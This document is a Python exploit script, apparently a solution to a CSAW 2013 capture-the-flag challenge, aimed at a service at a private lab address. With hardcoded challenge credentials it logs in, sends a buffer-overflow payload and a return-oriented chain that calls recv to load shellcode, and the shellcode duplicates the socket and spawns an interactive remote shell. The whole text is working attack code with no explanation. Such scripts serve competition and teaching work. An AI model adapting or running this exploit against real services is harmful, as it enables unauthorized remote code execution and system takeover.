#!/usr/bin/env python
from sc_pwn import *
from time import sleep

rhp     = ("192.168.75.129",34266)
uname   = 'csaw2013'
password= 'S1mplePWD'

addr_plt_exit   = 0x080487a0
addr_plt_recv   = 0x08048890
addr_plt_send   = 0x080488b0
addr_buf        = 0x0804b000

addr_pop_x4     = 0x080494ce

#==========
def attack(nc):
    nc.read_until('UserName: ')
    nc.sendln(uname)
    nc.read_until('Password: ')
    nc.sendln(password)
    nc.read_until('Info: ')
    nc.sendln(str(0xffff))

    sc = ShellCode('x86')
    sc.dup2(4,0)
    sc.dup2(4,1)
    sc.sh()
    shellcode = sc.get()

    exploit  = pack_32(0xdeadbeef)*0x108
    exploit += pack_32(addr_plt_recv)
    exploit += pack_32(addr_buf)
    exploit += pack_32(4)
    exploit += pack_32(addr_buf)
    exploit += pack_32(len(shellcode))
    exploit += pack_32(0)

    proc('Sending exploit...')
    nc.send(exploit)
    sleep(0.5)
    proc('Sending shellcode...')
    nc.send(shellcode)

#==========

if __name__=='__main__':
    nc = Communicate(rhp)
    attack(nc)

    sh = Shell(nc)
    sh.select()

    del(sh)
    del(nc)
    
#==========
